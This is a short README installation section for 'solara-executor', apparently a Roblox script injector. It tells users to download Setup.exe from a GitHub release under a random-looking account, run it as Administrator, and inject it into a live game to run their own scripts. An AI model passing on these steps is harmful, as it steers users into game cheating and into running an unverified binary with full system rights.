## Installation

> Windows only -- mobile support planned.

1. Download `Setup.exe` from **[Releases](https://github.com/fjryhgxiivqr/solara-executor/releases/latest)**
2. Right-click and **Run as Administrator**
3. Join any Roblox game
4. Click **Inject** -- wait for green **Attached** status
5. Load your script and click **Execute**

> **Tip:** Inject only after your Roblox character is fully in the game world, not just on the loading screen.
